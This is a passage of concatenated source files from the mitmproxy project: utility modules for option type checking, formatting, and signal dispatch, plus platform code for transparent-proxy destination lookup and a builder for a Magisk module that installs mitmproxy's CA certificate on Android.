fails with mypy at the moment.\n]\n\n\ndef check_option_type(name: str, value: typing.Any, typeinfo: Type) -> None:\n    \"\"\"\n    Check if the provided value is an instance of typeinfo and raises a\n    TypeError otherwise. This function supports only those types required for\n    options.\n    \"\"\"\n    e = TypeError(f\"Expected {typeinfo} for {name}, but got {type(value)}.\")\n\n    origin = typing.get_origin(typeinfo)\n\n    if origin is typing.Union or origin is UnionType:\n        for T in typing.get_args(typeinfo):\n            try:\n                check_option_type(name, value, T)\n            except TypeError:\n                pass\n            else:\n                return\n        raise e\n    elif origin is tuple:\n        types = typing.get_args(typeinfo)\n        if not isinstance(value, (tuple, list)):\n            raise e\n        if len(types) != len(value):\n            raise e\n        for i, (x, T) in enumerate(zip(value, types)):\n            check_option_type(f\"{name}[{i}]\", x, T)\n        return\n    elif origin is abc.Sequence:\n        T = typing.get_args(typeinfo)[0]\n        if not isinstance(value, (tuple, list)):\n            raise e\n        for v in value:\n            check_option_type(name, v, T)\n    elif origin is typing.IO or typeinfo in (typing.TextIO, typing.BinaryIO):\n        if hasattr(value, \"read\"):\n            return\n        else:\n            raise e\n    elif typeinfo is typing.Any:\n        return\n    elif not isinstance(value, typeinfo):\n        if typeinfo is float and isinstance(value, int):\n            return\n        raise e\n\n\ndef typespec_to_str(typespec: typing.Any) -> str:\n    if typespec in (str, int, float, bool):\n        t = typespec.__name__\n    elif typespec == typing.Optional[str]:\n        t = \"optional str\"\n    elif typespec in (typing.Sequence[str], abc.Sequence[str]):\n        t = \"sequence of str\"\n    elif typespec == typing.Optional[int]:\n        t = \"optional int\"\n    else:\n        raise NotImplementedError\n    return t\n", "mitmproxy/utils/sliding_window.py": "import itertools\nfrom collections.abc import Iterable\nfrom collections.abc import Iterator\nfrom typing import TypeVar\n\nT = TypeVar(\"T\")\n\n\ndef window(\n    iterator: Iterable[T], behind: int = 0, ahead: int = 0\n) -> Iterator[tuple[T | None, ...]]:\n    \"\"\"\n    Sliding window for an iterator.\n\n    Example:\n        >>> for prev, i, nxt in window(range(10), 1, 1):\n        >>>     print(prev, i, nxt)\n\n        None 0 1\n        0 1 2\n        1 2 3\n        2 3 None\n    \"\"\"\n    # TODO: move into utils\n    iters: list[Iterator[T | None]] = list(itertools.tee(iterator, behind + 1 + ahead))\n    for i in range(behind):\n        iters[i] = itertools.chain((behind - i) * [None], iters[i])\n    for i in range(ahead):\n        iters[-1 - i] = itertools.islice(\n            itertools.chain(iters[-1 - i], (ahead - i) * [None]), (ahead - i), None\n        )\n    return zip(*iters)\n", "mitmproxy/utils/spec.py": "from mitmproxy import flowfilter\n\n\ndef parse_spec(option: str) -> tuple[flowfilter.TFilter, str, str]:\n    \"\"\"\n    Parse strings in the following format:\n\n        [/flow-filter]/subject/replacement\n\n    \"\"\"\n    sep, rem = option[0], option[1:]\n    parts = rem.split(sep, 2)\n    if len(parts) == 2:\n        subject, replacement = parts\n        return flowfilter.match_all, subject, replacement\n    elif len(parts) == 3:\n        patt, subject, replacement = parts\n        flow_filter = flowfilter.parse(patt)\n        return flow_filter, subject, replacement\n    else:\n        raise ValueError(\"Invalid number of parameters (2 or 3 are expected)\")\n", "mitmproxy/utils/human.py": "import datetime\nimport functools\nimport ipaddress\nimport time\n\nSIZE_UNITS = {\n    \"b\": 1024**0,\n    \"k\": 1024**1,\n    \"m\": 1024**2,\n    \"g\": 1024**3,\n    \"t\": 1024**4,\n}\n\n\ndef pretty_size(size: int) -> str:\n    \"\"\"Convert a number of bytes into a human-readable string.\n\n    len(return value) <= 5 always holds true.\n    \"\"\"\n    s: float = size  # type cast for mypy\n    if s < 1024:\n        return f\"{s}b\"\n    for suffix in [\"k\", \"m\", \"g\", \"t\"]:\n        s /= 1024\n        if s < 99.95:\n            return f\"{s:.1f}{suffix}\"\n        if s < 1024 or suffix == \"t\":\n            return f\"{s:.0f}{suffix}\"\n    raise AssertionError\n\n\n@functools.lru_cache\ndef parse_size(s: str | None) -> int | None:\n    \"\"\"\n    Parse a size with an optional k/m/... suffix.\n    Invalid values raise a ValueError. For added convenience, passing `None` returns `None`.\n    \"\"\"\n    if s is None:\n        return None\n    try:\n        return int(s)\n    except ValueError:\n        pass\n    for i in SIZE_UNITS.keys():\n        if s.endswith(i):\n            try:\n                return int(s[:-1]) * SIZE_UNITS[i]\n            except ValueError:\n                break\n    raise ValueError(\"Invalid size specification.\")\n\n\ndef pretty_duration(secs: float | None) -> str:\n    formatters = [\n        (100, \"{:.0f}s\"),\n        (10, \"{:2.1f}s\"),\n        (1, \"{:1.2f}s\"),\n    ]\n    if secs is None:\n        return \"\"\n\n    for limit, formatter in formatters:\n        if secs >= limit:\n            return formatter.format(secs)\n    # less than 1 sec\n    return f\"{secs * 1000:.0f}ms\"\n\n\ndef format_timestamp(s):\n    s = time.localtime(s)\n    d = datetime.datetime.fromtimestamp(time.mktime(s))\n    return d.strftime(\"%Y-%m-%d %H:%M:%S\")\n\n\ndef format_timestamp_with_milli(s):\n    d = datetime.datetime.fromtimestamp(s)\n    return d.strftime(\"%Y-%m-%d %H:%M:%S.%f\")[:-3]\n\n\n@functools.lru_cache\ndef format_address(address: tuple | None) -> str:\n    \"\"\"\n    This function accepts IPv4/IPv6 tuples and\n    returns the formatted address string with port number\n    \"\"\"\n    if address is None:\n        return \"<no address>\"\n    try:\n        host = ipaddress.ip_address(address[0])\n        if host.is_unspecified:\n            return f\"*:{address[1]}\"\n        if isinstance(host, ipaddress.IPv4Address):\n            return f\"{str(host)}:{address[1]}\"\n        # If IPv6 is mapped to IPv4\n        elif host.ipv4_mapped:\n            return f\"{str(host.ipv4_mapped)}:{address[1]}\"\n        return f\"[{str(host)}]:{address[1]}\"\n    except ValueError:\n        return f\"{address[0]}:{address[1]}\"\n", "mitmproxy/utils/magisk.py": "import hashlib\nimport os\nfrom zipfile import ZipFile\n\nfrom cryptography import x509\nfrom cryptography.hazmat.primitives import serialization\n\nfrom mitmproxy import certs\nfrom mitmproxy import ctx\nfrom mitmproxy.options import CONF_BASENAME\n\n# The following 3 variables are for including in the magisk module as text file\nMODULE_PROP_TEXT = \"\"\"id=mitmproxycert\nname=MITMProxy cert\nversion=v1\nversionCode=1\nauthor=mitmproxy\ndescription=Adds the mitmproxy certificate to the system store\ntemplate=3\"\"\"\n\nCONFIG_SH_TEXT = \"\"\"\nMODID=mitmproxycert\nAUTOMOUNT=true\nPROPFILE=false\nPOSTFSDATA=false\nLATESTARTSERVICE=false\n\nprint_modname() {\n  ui_print \"*******************************\"\n  ui_print \"    MITMProxy cert installer   \"\n  ui_print \"*******************************\"\n}\n\nREPLACE=\"\n\"\n\nset_permissions() {\n  set_perm_recursive  $MODPATH  0  0  0755  0644\n}\n\"\"\"\n\nUPDATE_BINARY_TEXT = \"\"\"\n#!/sbin/sh\n\n#################\n# Initialization\n#################\n\numask 022\n\n# echo before loading util_functions\nui_print() { echo \"$1\"; }\n\nrequire_new_magisk() {\n  ui_print \"*******************************\"\n  ui_print \" Please install Magisk v20.4+! \"\n  ui_print \"*******************************\"\n  exit 1\n}\n\nOUTFD=$2\nZIPFILE=$3\n\nmount /data 2>/dev/null\n[ -f /data/adb/magisk/util_functions.sh ] || require_new_magisk\n. /data/adb/magisk/util_functions.sh\n[ $MAGISK_VER_CODE -lt 20400 ] && require_new_magisk\n\ninstall_module\nexit 0\n\"\"\"\n\n\ndef get_ca_from_files() -> x509.Certificate:\n    # Borrowed from tlsconfig\n    certstore_path = os.path.expanduser(ctx.options.confdir)\n    certstore = certs.CertStore.from_store(\n        path=certstore_path,\n        basename=CONF_BASENAME,\n        key_size=ctx.options.key_size,\n        passphrase=ctx.options.cert_passphrase.encode(\"utf8\")\n        if ctx.options.cert_passphrase\n        else None,\n    )\n    return certstore.default_ca._cert\n\n\ndef subject_hash_old(ca: x509.Certificate) -> str:\n    # Mimics the -subject_hash_old option of openssl used for android certificate names\n    full_hash = hashlib.md5(ca.subject.public_bytes()).digest()\n    sho = full_hash[0] | (full_hash[1] << 8) | (full_hash[2] << 16) | full_hash[3] << 24\n    return hex(sho)[2:]\n\n\ndef write_magisk_module(path: str):\n    # Makes a zip file that can be loaded by Magisk\n    # Android certs are stored as DER files\n    ca = get_ca_from_files()\n    der_cert = ca.public_bytes(serialization.Encoding.DER)\n    with ZipFile(path, \"w\") as zipp:\n        # Main cert file, name is always the old subject hash with a '.0' added\n        zipp.writestr(f\"system/etc/security/cacerts/{subject_hash_old(ca)}.0\", der_cert)\n        zipp.writestr(\"module.prop\", MODULE_PROP_TEXT)\n        zipp.writestr(\"config.sh\", CONFIG_SH_TEXT)\n        zipp.writestr(\"META-INF/com/google/android/updater-script\", \"#MAGISK\")\n        zipp.writestr(\"META-INF/com/google/android/update-binary\", UPDATE_BINARY_TEXT)\n        zipp.writestr(\n            \"common/file_contexts_image\", \"/magisk(/.*)? u:object_r:system_file:s0\"\n        )\n        zipp.writestr(\"common/post-fs-data.sh\", \"MODDIR=${0%/*}\")\n        zipp.writestr(\"common/service.sh\", \"MODDIR=${0%/*}\")\n        zipp.writestr(\"common/system.prop\", \"\")\n", "mitmproxy/utils/signals.py": "\"\"\"\nThis module provides signals, which are a simple dispatching system that allows any number of interested parties\nto subscribe to events (\"signals\").\n\nThis is similar to the Blinker library (https://pypi.org/project/blinker/), with the following changes:\n  - provides only a small subset of Blinker's functionality\n  - supports type hints\n  - supports async receivers.\n\"\"\"\n\nfrom __future__ import annotations\n\nimport asyncio\nimport inspect\nimport weakref\nfrom collections.abc import Awaitable\nfrom collections.abc import Callable\nfrom typing import Any\nfrom typing import cast\nfrom typing import Generic\nfrom typing import ParamSpec\nfrom typing import TypeVar\n\nP = ParamSpec(\"P\")\nR = TypeVar(\"R\")\n\n\ndef make_weak_ref(obj: Any) -> weakref.ReferenceType:\n    \"\"\"\n    Like weakref.ref(), but using weakref.WeakMethod for bound methods.\n    \"\"\"\n    if hasattr(obj, \"__self__\"):\n        return cast(weakref.ref, weakref.WeakMethod(obj))\n    else:\n        return weakref.ref(obj)\n\n\n# We're running into https://github.com/python/mypy/issues/6073 here,\n# which is why the base class is a mixin and not a generic superclass.\nclass _SignalMixin:\n    def __init__(self) -> None:\n        self.receivers: list[weakref.ref[Callable]] = []\n\n    def connect(self, receiver: Callable) -> None:\n        \"\"\"\n        Register a signal receiver.\n\n        The signal will only hold a weak reference to the receiver function.\n        \"\"\"\n        receiver = make_weak_ref(receiver)\n        self.receivers.append(receiver)\n\n    def disconnect(self, receiver: Callable) -> None:\n        self.receivers = [r for r in self.receivers if r() != receiver]\n\n    def notify(self, *args, **kwargs):\n        cleanup = False\n        for ref in self.receivers:\n            r = ref()\n            if r is not None:\n                yield r(*args, **kwargs)\n            else:\n                cleanup = True\n        if cleanup:\n            self.receivers = [r for r in self.receivers if r() is not None]\n\n\nclass _SyncSignal(Generic[P], _SignalMixin):\n    def connect(self, receiver: Callable[P, None]) -> None:\n        assert not asyncio.iscoroutinefunction(receiver)\n        super().connect(receiver)\n\n    def disconnect(self, receiver: Callable[P, None]) -> None:\n        super().disconnect(receiver)\n\n    def send(self, *args: P.args, **kwargs: P.kwargs) -> None:\n        for ret in super().notify(*args, **kwargs):\n            assert ret is None or not inspect.isawaitable(ret)\n\n\nclass _AsyncSignal(Generic[P], _SignalMixin):\n    def connect(self, receiver: Callable[P, Awaitable[None] | None]) -> None:\n        super().connect(receiver)\n\n    def disconnect(self, receiver: Callable[P, Awaitable[None] | None]) -> None:\n        super().disconnect(receiver)\n\n    async def send(self, *args: P.args, **kwargs: P.kwargs) -> None:\n        await asyncio.gather(\n            *[\n                aws\n                for aws in super().notify(*args, **kwargs)\n                if aws is not None and inspect.isawaitable(aws)\n            ]\n        )\n\n\n# noinspection PyPep8Naming\ndef SyncSignal(receiver_spec: Callable[P, None]) -> _SyncSignal[P]:\n    \"\"\"\n    Create a synchronous signal with the given function signature for receivers.\n\n    Example:\n\n        s = SyncSignal(lambda event: None)  # all receivers must accept a single \"event\" argument.\n        def receiver(event):\n            print(event)\n\n        s.connect(receiver)\n        s.send(\"foo\")  # prints foo\n        s.send(event=\"bar\")  # prints bar\n\n        def receiver2():\n            ...\n\n        s.connect(receiver2)  # mypy complains about receiver2 not having the right signature\n\n        s2 = SyncSignal(lambda: None)  # this signal has no arguments\n        s2.send()\n    \"\"\"\n    return cast(_SyncSignal[P], _SyncSignal())\n\n\n# noinspection PyPep8Naming\ndef AsyncSignal(receiver_spec: Callable[P, Awaitable[None] | None]) -> _AsyncSignal[P]:\n    \"\"\"\n    Create an signal that supports both regular and async receivers:\n\n    Example:\n\n        s = AsyncSignal(lambda event: None)\n        async def receiver(event):\n            print(event)\n        s.connect(receiver)\n        await s.send(\"foo\")  # prints foo\n    \"\"\"\n    return cast(_AsyncSignal[P], _AsyncSignal())\n", "mitmproxy/utils/asyncio_utils.py": "import asyncio\nimport os\nimport sys\nimport time\nfrom collections.abc import Coroutine\nfrom collections.abc import Iterator\nfrom contextlib import contextmanager\n\nfrom mitmproxy.utils import human\n\n\ndef create_task(\n    coro: Coroutine,\n    *,\n    name: str,\n    client: tuple | None = None,\n) -> asyncio.Task:\n    \"\"\"\n    Like asyncio.create_task, but also store some debug info on the task object.\n    \"\"\"\n    t = asyncio.create_task(coro)\n    set_task_debug_info(t, name=name, client=client)\n    return t\n\n\ndef set_task_debug_info(\n    task: asyncio.Task,\n    *,\n    name: str,\n    client: tuple | None = None,\n) -> None:\n    \"\"\"Set debug info for an externally-spawned task.\"\"\"\n    task.created = time.time()  # type: ignore\n    if __debug__ is True and (test := os.environ.get(\"PYTEST_CURRENT_TEST\", None)):\n        name = f\"{name} [created in {test}]\"\n    task.set_name(name)\n    if client:\n        task.client = client  # type: ignore\n\n\ndef set_current_task_debug_info(\n    *,\n    name: str,\n    client: tuple | None = None,\n) -> None:\n    \"\"\"Set debug info for the current task.\"\"\"\n    task = asyncio.current_task()\n    assert task\n    set_task_debug_info(task, name=name, client=client)\n\n\ndef task_repr(task: asyncio.Task) -> str:\n    \"\"\"Get a task representation with debug info.\"\"\"\n    name = task.get_name()\n    a: float = getattr(task, \"created\", 0)\n    if a:\n        age = f\" (age: {time.time() - a:.0f}s)\"\n    else:\n        age = \"\"\n    client = getattr(task, \"client\", \"\")\n    if client:\n        client = f\"{human.format_address(client)}: \"\n    return f\"{client}{name}{age}\"\n\n\n@contextmanager\ndef install_exception_handler(handler) -> Iterator[None]:\n    loop = asyncio.get_running_loop()\n    existing = loop.get_exception_handler()\n    loop.set_exception_handler(handler)\n    try:\n        yield\n    finally:\n        loop.set_exception_handler(existing)\n\n\n@contextmanager\ndef set_eager_task_factory() -> Iterator[None]:\n    loop = asyncio.get_running_loop()\n    if sys.version_info < (3, 12):  # pragma: no cover\n        yield\n    else:\n        existing = loop.get_task_factory()\n        loop.set_task_factory(asyncio.eager_task_factory)  # type: ignore\n        try:\n            yield\n        finally:\n            loop.set_task_factory(existing)\n", "mitmproxy/utils/__init__.py": "", "mitmproxy/utils/arg_check.py": "import re\nimport sys\n\nDEPRECATED = \"\"\"\n--confdir\n-Z\n--body-size-limit\n--stream\n--palette\n--palette-transparent\n--follow\n--order\n--no-mouse\n--reverse\n--http2-priority\n--no-http2-priority\n--no-websocket\n--websocket\n--upstream-bind-address\n--ciphers-client\n--ciphers-server\n--client-certs\n--no-upstream-cert\n--add-upstream-certs-to-client-chain\n--upstream-trusted-confdir\n--upstream-trusted-ca\n--ssl-version-client\n--ssl-version-server\n--no-onboarding\n--onboarding-host\n--onboarding-port\n--server-replay-use-header\n--no-pop\n--replay-ignore-content\n--replay-ignore-payload-param\n--replay-ignore-param\n--replay-ignore-host\n--replace-from-file\n\"\"\"\n\nREPLACED = \"\"\"\n-t\n-u\n--wfile\n-a\n--afile\n-z\n-b\n--bind-address\n--port\n-I\n--ignore\n--tcp\n--cert\n--insecure\n-c\n--replace\n--replacements\n-i\n-f\n--filter\n--socks\n--server-replay-nopop\n\"\"\"\n\nREPLACEMENTS = {\n    \"--stream\": \"stream_large_bodies\",\n    \"--palette\": \"console_palette\",\n    \"--palette-transparent\": \"console_palette_transparent:\",\n    \"--follow\": \"console_focus_follow\",\n    \"--order\": \"view_order\",\n    \"--no-mouse\": \"console_mouse\",\n    \"--reverse\": \"view_order_reversed\",\n    \"--no-websocket\": \"websocket\",\n    \"--no-upstream-cert\": \"upstream_cert\",\n    \"--upstream-trusted-confdir\": \"ssl_verify_upstream_trusted_confdir\",\n    \"--upstream-trusted-ca\": \"ssl_verify_upstream_trusted_ca\",\n    \"--no-onboarding\": \"onboarding\",\n    \"--no-pop\": \"server_replay_reuse\",\n    \"--replay-ignore-content\": \"server_replay_ignore_content\",\n    \"--replay-ignore-payload-param\": \"server_replay_ignore_payload_params\",\n    \"--replay-ignore-param\": \"server_replay_ignore_params\",\n    \"--replay-ignore-host\": \"server_replay_ignore_host\",\n    \"--replace-from-file\": \"replacements (use @ to specify path)\",\n    \"-t\": \"--stickycookie\",\n    \"-u\": \"--stickyauth\",\n    \"--wfile\": \"--save-stream-file\",\n    \"-a\": \"-w  Prefix path with + to append.\",\n    \"--afile\": \"-w  Prefix path with + to append.\",\n    \"-z\": \"--anticomp\",\n    \"-b\": \"--listen-host\",\n    \"--bind-address\": \"--listen-host\",\n    \"--port\": \"--listen-port\",\n    \"-I\": \"--ignore-hosts\",\n    \"--ignore\": \"--ignore-hosts\",\n    \"--tcp\": \"--tcp-hosts\",\n    \"--cert\": \"--certs\",\n    \"--insecure\": \"--ssl-insecure\",\n    \"-c\": \"-C\",\n    \"--replace\": [\"--modify-body\", \"--modify-headers\"],\n    \"--replacements\": [\"--modify-body\", \"--modify-headers\"],\n    \"-i\": \"--intercept\",\n    \"-f\": \"--view-filter\",\n    \"--filter\": \"--view-filter\",\n    \"--socks\": \"--mode socks5\",\n    \"--server-replay-nopop\": \"--server-replay-reuse\",\n}\n\n\ndef check():\n    args = sys.argv[1:]\n    print()\n    if \"-U\" in args:\n        print(\"-U is deprecated, please use --mode upstream:SPEC instead\")\n\n    if \"-T\" in args:\n        print(\"-T is deprecated, please use --mode transparent instead\")\n\n    for option in (\"-e\", \"--eventlog\", \"--norefresh\"):\n        if option in args:\n            print(f\"{option} has been removed.\")\n\n    for option in (\"--nonanonymous\", \"--singleuser\", \"--htpasswd\"):\n        if option in args:\n            print(\n                \"{} is deprecated.\\n\"\n                \"Please use `--proxyauth SPEC` instead.\\n\"\n                'SPEC Format: \"username:pass\", \"any\" to accept any user/pass combination,\\n'\n                '\"@path\" to use an Apache htpasswd file, or\\n'\n                '\"ldap[s]:url_server_ldap[:port]:dn_auth:password:dn_subtree[?search_filter_key=...]\" '\n                \"for LDAP authentication.\".format(option)\n            )\n\n    for option in REPLACED.splitlines():\n        if option in args:\n            r = REPLACEMENTS.get(option)\n            if isinstance(r, list):\n                new_options = r\n            else:\n                new_options = [r]\n            print(\n                \"{} is deprecated.\\n\" \"Please use `{}` instead.\".format(\n                    option, \"` or `\".join(new_options)\n                )\n            )\n\n    for option in DEPRECATED.splitlines():\n        if option in args:\n            print(\n                \"{} is deprecated.\\n\"\n                \"Please use `--set {}=value` instead.\\n\"\n                \"To show all options and their default values use --options\".format(\n                    option,\n                    REPLACEMENTS.get(option, None)\n                    or option.lstrip(\"-\").replace(\"-\", \"_\"),\n                )\n            )\n\n    # Check for underscores in the options. Options always follow '--'.\n    for argument in args:\n        underscoreParam = re.search(r\"[-]{2}((.*?_)(.*?(\\s|$)))+\", argument)\n        if underscoreParam is not None:\n            print(\n                \"{} uses underscores, please use hyphens {}\".format(\n                    argument, argument.replace(\"_\", \"-\")\n                )\n            )\n", "mitmproxy/utils/vt_codes.py": "\"\"\"\nThis module provides a method to detect if a given file object supports virtual terminal escape codes.\n\"\"\"\n\nimport os\nimport sys\nfrom typing import IO\n\nif os.name == \"nt\":\n    from ctypes import byref  # type: ignore\n    from ctypes import windll  # type: ignore\n    from ctypes.wintypes import BOOL\n    from ctypes.wintypes import DWORD\n    from ctypes.wintypes import HANDLE\n    from ctypes.wintypes import LPDWORD\n\n    ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004\n    STD_OUTPUT_HANDLE = -11\n    STD_ERROR_HANDLE = -12\n\n    # https://docs.microsoft.com/de-de/windows/console/getstdhandle\n    GetStdHandle = windll.kernel32.GetStdHandle\n    GetStdHandle.argtypes = [DWORD]\n    GetStdHandle.restype = HANDLE\n\n    # https://docs.microsoft.com/de-de/windows/console/getconsolemode\n    GetConsoleMode = windll.kernel32.GetConsoleMode\n    GetConsoleMode.argtypes = [HANDLE, LPDWORD]\n    GetConsoleMode.restype = BOOL\n\n    # https://docs.microsoft.com/de-de/windows/console/setconsolemode\n    SetConsoleMode = windll.kernel32.SetConsoleMode\n    SetConsoleMode.argtypes = [HANDLE, DWORD]\n    SetConsoleMode.restype = BOOL\n\n    def ensure_supported(f: IO[str]) -> bool:\n        if not f.isatty():\n            return False\n        if f == sys.stdout:\n            h = STD_OUTPUT_HANDLE\n        elif f == sys.stderr:\n            h = STD_ERROR_HANDLE\n        else:\n            return False\n\n        handle = GetStdHandle(h)\n        console_mode = DWORD()\n        ok = GetConsoleMode(handle, byref(console_mode))\n        if not ok:\n            return False\n\n        ok = SetConsoleMode(\n            handle, console_mode.value | ENABLE_VIRTUAL_TERMINAL_PROCESSING\n        )\n        return ok\n\nelse:\n\n    def ensure_supported(f: IO[str]) -> bool:\n        return f.isatty()\n", "mitmproxy/utils/pyinstaller/hook-mitmproxy.addons.onboardingapp.py": "from PyInstaller.utils.hooks import collect_data_files\n\ndatas = collect_data_files(\"mitmproxy.addons.onboardingapp\")\n", "mitmproxy/utils/pyinstaller/hook-mitmproxy.tools.web.py": "from PyInstaller.utils.hooks import collect_data_files\n\ndatas = collect_data_files(\"mitmproxy.tools.web\")\n", "mitmproxy/utils/pyinstaller/hook-mitmproxy.py": "hiddenimports = [\"mitmproxy.script\"]\n", "mitmproxy/utils/pyinstaller/__init__.py": "from pathlib import Path\n\nhere = Path(__file__).parent.absolute()\n\n\ndef hook_dirs() -> list[str]:\n    return [str(here)]\n", "mitmproxy/script/__init__.py": "from .concurrent import concurrent\n\n__all__ = [\n    \"concurrent\",\n]\n", "mitmproxy/script/concurrent.py": "\"\"\"\nThis module provides a @concurrent decorator primitive to\noffload computations from mitmproxy's main master thread.\n\"\"\"\n\nimport asyncio\nimport inspect\n\nfrom mitmproxy import hooks\n\n\ndef concurrent(fn):\n    if fn.__name__ not in set(hooks.all_hooks.keys()) - {\"load\", \"configure\"}:\n        raise NotImplementedError(\n            \"Concurrent decorator not supported for '%s' method.\" % fn.__name__\n        )\n\n    async def _concurrent(*args):\n        def run():\n            if inspect.iscoroutinefunction(fn):\n                # Run the async function in a new event loop\n                loop = asyncio.new_event_loop()\n                try:\n                    loop.run_until_complete(fn(*args))\n                finally:\n                    loop.close()\n            else:\n                fn(*args)\n\n        await asyncio.get_running_loop().run_in_executor(None, run)\n\n    return _concurrent\n", "mitmproxy/platform/pf.py": "import re\nimport sys\n\n\ndef lookup(address, port, s):\n    \"\"\"\n    Parse the pfctl state output s, to look up the destination host\n    matching the client (address, port).\n\n    Returns an (address, port) tuple, or None.\n    \"\"\"\n    # We may get an ipv4-mapped ipv6 address here, e.g. ::ffff:127.0.0.1.\n    # Those still appear as \"127.0.0.1\" in the table, so we need to strip the prefix.\n    address = re.sub(r\"^::ffff:(?=\\d+.\\d+.\\d+.\\d+$)\", \"\", address)\n    s = s.decode()\n\n    # ALL tcp 192.168.1.13:57474 -> 23.205.82.58:443       ESTABLISHED:ESTABLISHED\n    specv4 = f\"{address}:{port}\"\n\n    # ALL tcp 2a01:e35:8bae:50f0:9d9b:ef0d:2de3:b733[58505] -> 2606:4700:30::681f:4ad0[443]       ESTABLISHED:ESTABLISHED\n    specv6 = f\"{address}[{port}]\"\n\n    for i in s.split(\"\\n\"):\n        if \"ESTABLISHED:ESTABLISHED\" in i and specv4 in i:\n            s = i.split()\n            if len(s) > 4:\n                if sys.platform.startswith(\"freebsd\"):\n                    # strip parentheses for FreeBSD pfctl\n                    s = s[3][1:-1].split(\":\")\n                else:\n                    s = s[4].split(\":\")\n\n                if len(s) == 2:\n                    return s[0], int(s[1])\n        elif \"ESTABLISHED:ESTABLISHED\" in i and specv6 in i:\n            s = i.split()\n            if len(s) > 4:\n                s = s[4].split(\"[\")\n                port = s[1].split(\"]\")\n                port = port[0]\n                return s[0], int(port)\n    raise RuntimeError(\"Could not resolve original destination.\")\n", "mitmproxy/platform/linux.py": "import socket\nimport struct\n\n# Python's socket module does not have these constants\nSO_ORIGINAL_DST = 80\nSOL_IPV6 = 41\n\n\ndef original_addr(csock: socket.socket) -> tuple[str, int]:\n    # Get the original destination on Linux.\n    # In theory, this can be done using the following syscalls:\n    #     sock.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)\n    #     sock.getsockopt(SOL_IPV6, SO_ORIGINAL_DST, 28)\n    #\n    # In practice, it is a bit more complex:\n    #  1. We cannot rely on sock.family to decide which syscall to use because of IPv4-mapped\n    #     IPv6 addresses. If sock.family is AF_INET6 while sock.getsockname() is ::ffff:127.0.0.1,\n    #     we need to call the IPv4 version to get a result.\n    #  2. We can't just try the IPv4 syscall and then do IPv6 if that doesn't work,\n    #     because doing the wrong syscall can apparently crash the whole Python runtime.\n    # As such, we use a heuristic to check which syscall to do.\n    is_ipv4 = \".\" in csock.getsockname()[0]  # either 127.0.0.1 or ::ffff:127.0.0.1\n    if is_ipv4:\n        # the struct returned here should only have 8 bytes, but invoking sock.getsockopt\n        # with buflen=8 doesn't work.\n        dst = csock.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)\n        port, raw_ip = struct.unpack_from(\"!2xH4s\", dst)\n        ip = socket.inet_ntop(socket.AF_INET, raw_ip)\n    else:\n        dst = csock.getsockopt(SOL_IPV6, SO_ORIGINAL_DST, 28)\n        port, raw_ip = struct.unpack_from(\"!2xH4x16s\", dst)\n        ip = socket.inet_ntop(socket.AF_INET6, raw_ip)\n    return ip, port\n", "mitmproxy/platform/windows.py": "from __future__ import annotations\n\nimport collections.abc\nimport contextlib\nimport ctypes.wintypes\nimport json\nimport logging\nimport os\nimport re\nimport socket\nimport socketserver\nimport threading\nimport time\nfrom collections.abc import Callable\nfrom typing import Any\nfrom typing import cast\nfrom typing import ClassVar\nfrom typing import IO\n\nimport pydivert.consts\n\nfrom mitmproxy.net.local_ip import get_local_ip\nfrom mitmproxy.net.local_ip import get_local_ip6\n\nREDIRECT_API_HOST = \"127.0.0.1\"\nREDIRECT_API_PORT = 8085\n\n\nlogger = logging.getLogger(__name__)\n\n\n##########################\n# Resolver\n\n\ndef read(rfile: IO[bytes]) -> Any:\n    x = rfile.readline().strip()\n    if not x:\n        return None\n    return json.loads(x)\n\n\ndef write(data, wfile: IO[bytes]) -> None:\n    wfile.write(json.dumps(data).encode() + b\"\\n\")\n    wfile.flush()\n\n\nclass Resolver:\n    sock: socket.socket | None\n    lock: threading.RLock\n\n    def __init__(self):\n        self.sock = None\n        self.lock = threading.RLock()\n\n    def setup(self):\n        with self.lock:\n            TransparentProxy.setup()\n            self._connect()\n\n    def _connect(self):\n        if self.sock:\n            self.sock.close()\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.connect((REDIRECT_API_HOST, REDIRECT_API_PORT))\n\n        self.wfile = self.sock.makefile(\"wb\")\n        self.rfile = self.sock.makefile(\"rb\")\n        write(os.getpid(), self.wfile)\n\n    def original_addr(self, csock: socket.socket):\n        ip, port = csock.getpeername()[:2]\n        ip = re.sub(r\"^::ffff:(?=\\d+.\\d+.\\d+.\\d+$)\", \"\", ip)\n        ip = ip.split(\"%\", 1)[0]\n        with self.lock:\n            try:\n                write((ip, port), self.wfile)\n                addr = read(self.rfile)\n                if addr is None:\n                    raise RuntimeError(\"Cannot resolve original destination.\")\n                return tuple(addr)\n            except (EOFError, OSError, AttributeError):\n                self._connect()\n                return self.original_addr(csock)\n\n\nclass APIRequestHandler(socketserver.StreamRequestHandler):\n    \"\"\"\n    TransparentProxy API: Returns the pickled server address, port tuple\n    for each received pickled client address, port tuple.\n    \"\"\"\n\n    server: APIServer\n\n    def handle(self) -> None:\n        proxifier: TransparentProxy = self.server.proxifier\n        try:\n            pid: int = read(self.rfile)\n            if pid is None:\n                return\n            with proxifier.exempt(pid):\n                while True:\n                    c = read(self.rfile)\n                    if c is None:\n                        return\n                    try:\n                        server = proxifier.client_server_map[\n                            cast(tuple[str, int], tuple(c))\n                        ]\n                    except KeyError:\n                        server = None\n                    write(server, self.wfile)\n        except (EOFError, OSError):\n            pass\n\n\nclass APIServer(socketserver.ThreadingMixIn, socketserver.TCPServer):\n    def __init__(self, proxifier, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self.proxifier = proxifier\n        self.daemon_threads = True\n\n\n##########################\n# Windows API\n\n# from Windows' error.h\nERROR_INSUFFICIENT_BUFFER = 0x7A\n\nIN6_ADDR = ctypes.c_ubyte * 16\nIN4_ADDR = ctypes.c_ubyte * 4\n\n\n#\n# IPv6\n#\n\n\n# https://msdn.microsoft.com/en-us/library/windows/desktop/aa366896(v=vs.85).aspx\nclass MIB_TCP6ROW_OWNER_PID(ctypes.Structure):\n    _fields_ = [\n        (\"ucLocalAddr\", IN6_ADDR),\n        (\"dwLocalScopeId\", ctypes.wintypes.DWORD),\n        (\"dwLocalPort\", ctypes.wintypes.DWORD),\n        (\"ucRemoteAddr\", IN6_ADDR),\n        (\"dwRemoteScopeId\", ctypes.wintypes.DWORD),\n        (\"dwRemotePort\", ctypes.wintypes.DWORD),\n        (\"dwState\", ctypes.wintypes.DWORD),\n        (\"dwOwningPid\", ctypes.wintypes.DWORD),\n  